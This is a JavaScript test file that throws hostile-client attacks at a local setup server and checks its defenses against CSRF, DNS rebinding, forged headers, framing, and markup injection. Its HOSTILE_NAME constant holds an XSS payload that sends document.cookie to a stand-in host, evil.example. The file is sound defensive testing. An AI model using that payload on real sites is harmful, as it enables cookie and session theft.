// Hostile-client fixtures for the local setup server (#173): what a malicious
// website, a DNS-rebinding page or a poisoned media server could try, run
// against the real server started by startSetupApp.
import test from "node:test";
import assert from "node:assert/strict";
import { request } from "node:http";
import { mkdtemp, rm } from "node:fs/promises";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { startSetupApp } from "../src/setup-app.js";

const HOSTILE_NAME = `<img src=x onerror="fetch('https://evil.example/?'+document.cookie)"><script>alert(1)</script>`;

function raw(url, { method = "GET", headers = {}, body } = {}) {
  const target = new URL(url);
  return new Promise((resolve, reject) => {
    const req = request({ host: target.hostname, port: target.port, path: target.pathname, method, headers }, (res) => {
      const chunks = [];
      res.on("data", (chunk) => chunks.push(chunk));
      res.on("end", () => resolve({ status: res.statusCode, headers: res.headers, body: Buffer.concat(chunks).toString() }));
    });
    req.once("error", reject);
    req.end(body);
  });
}

async function withSetup(run) {
  const dir = await mkdtemp(join(tmpdir(), "np-hostile-"));
  const app = await startSetupApp({ draftFile: join(dir, "draft.json"), discover: async () => [{ provider: "jellyfin", baseUrl: "http://127.0.0.1:8096", name: HOSTILE_NAME, version: HOSTILE_NAME }] });
  try { await run(app); } finally { await app.close(); await rm(dir, { recursive: true, force: true }); }
}

test("a cross-site form post can't change setup", async () => {
  await withSetup(async (app) => {
    const api = new URL("/api/setup/draft", app.url);
    const form = await raw(api, { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded", Origin: "https://evil.example", "Sec-Fetch-Site": "cross-site" }, body: "action=reset" });
    assert.equal(form.status, 403);
    // Old browsers without Sec-Fetch-Site / Origin: the form content type and missing session still stop it.
    const legacy = await raw(api, { method: "POST", headers: { "Content-Type": "text/plain" }, body: '{"action":"reset"}' });
    assert.equal(legacy.status, 415);
  });
});

test("a cross-site fetch can't change setup, even with a JSON body", async () => {
  await withSetup(async (app) => {
    const api = new URL("/api/setup/draft", app.url);
    for (const headers of [
      { Origin: "https://evil.example", "Sec-Fetch-Site": "cross-site" },
      { Origin: "http://localhost.evil.example", "Sec-Fetch-Site": "same-site" },
      { Origin: "null" },
    ]) {
      const result = await raw(api, { method: "POST", headers: { "Content-Type": "application/json", ...headers }, body: '{"action":"next"}' });
      assert.equal(result.status, 403, JSON.stringify(headers));
    }
  });
});

test("a DNS-rebinding page can neither read nor write setup state", async () => {
  await withSetup(async (app) => {
    const port = new URL(app.url).port;
    const read = await raw(new URL("/api/setup/draft", app.url), { headers: { Host: `rebind.evil.example:${port}` } });
    assert.equal(read.status, 421);
    const write = await raw(new URL("/api/setup/draft", app.url), { method: "POST", headers: { Host: `rebind.evil.example:${port}`, Origin: `http://rebind.evil.example:${port}`, "Content-Type": "application/json", "X-Nowplaying-Session": app.sessionSecret }, body: "{}" });
    assert.equal(write.status, 421);
  });
});

test("a local page that forges browser headers still needs this run's session", async () => {
  await withSetup(async (app) => {
    const origin = new URL(app.url).origin;
    const forged = await raw(new URL("/api/setup/draft", app.url), { method: "POST", headers: { Origin: origin, "Sec-Fetch-Site": "same-origin", "Content-Type": "application/json", Cookie: "nowplaying_session=guessed" }, body: '{"action":"next"}' });
    assert.equal(forged.status, 403);
  });
});

test("the wizard can't be framed and runs no inline or third-party script", async () => {
  await withSetup(async (app) => {
    const page = await raw(app.url);
    assert.equal(page.status, 200);
    assert.equal(page.headers["x-frame-options"], "DENY");
    const csp = page.headers["content-security-policy"];
    assert.match(csp, /frame-ancestors 'none'/);
    assert.match(csp, /script-src 'self'(;|$)/);
    assert.doesNotMatch(csp, /unsafe-inline|unsafe-eval|https?:/);
    assert.doesNotMatch(page.body, /<script(?![^>]*\bsrc="\/setup\/)/i);
  });
});

test("provider-controlled text reaches the page as data, never markup", async () => {
  await withSetup(async (app) => {
    const found = await raw(new URL("/api/setup/discover", app.url));
    assert.equal(found.status, 200);
    assert.match(found.headers["content-type"], /^application\/json/);
    assert.equal(found.headers["x-content-type-options"], "nosniff");
    // Whatever survives into the JSON is inert text; the page script only ever
    // writes it with textContent.
    const script = await raw(new URL("/setup/app.js", app.url));
    assert.equal(script.status, 200);
    assert.doesNotMatch(script.body, /innerHTML|outerHTML|insertAdjacentHTML|document\.write|eval\(|new Function/);
  });
});
